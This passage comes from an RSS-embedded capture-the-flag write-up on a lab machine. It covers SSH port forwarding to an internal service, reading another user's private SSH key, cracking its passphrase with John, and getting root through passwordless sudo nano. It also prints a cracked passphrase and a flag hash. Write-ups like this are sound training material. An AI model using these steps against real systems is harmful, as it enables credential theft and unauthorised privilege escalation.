&lt;p&gt;&lt;code&gt;-L 9001:127.0.0.1:52846&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Alternatively, if I&amp;rsquo;ve fluffed that up on the writeup, you can also do it in the following single line:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -L 9001:127.0.0.1:52846 -f -N jimmy@10.10.10.171&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This basically says that the client (i.e ME) will listen (-L) on port 9001, and SSH will tunnel those connections from 127.0.0.1, port 52846 - which is what we want as per the netstat. The full SSH command includes 2 additional flags - &lt;code&gt;-f&lt;/code&gt; backgrounds the request so you don&amp;rsquo;t see any output and &lt;code&gt;-N&lt;/code&gt; tells SSH that no commands are to be run - both of these make it so you can seamlessly forward the port to your machine without any output or interaction besides the orignial command.&lt;/p&gt;
&lt;p&gt;Viewing the page on the forwarded port, we see something interesting. It runs the EXACT same exec code that we see in the &lt;code&gt;internal&lt;/code&gt; directory only this time it runs it as Joanna - meaning we can actually cat the contents of the id_rsa file in her home folder. Result.&lt;/p&gt;
&lt;p&gt;Once I had the RSA key we used SSH2John to convert it to a format john was happy with and then passed it to the kracken which got us the passphrase: &lt;code&gt;bloodninjas&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Got in as Joanna. Got the user flag. Boom.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Root was unbelievably easy compared to the user steps.&lt;/p&gt;
&lt;p&gt;I ran linPeas but it wasn&amp;rsquo;t really necessary; doing standard enum is enough. So I ran:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And found out Joanna had sudo access to the following command without a password:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo /bin/nano /opt/priv&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It was purely a case of running that exact command along with &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nano/#sudo&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
 from GTFOBins:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
2f907ed450b361b2c2bf4e8795d5b561
#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Done! :)&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
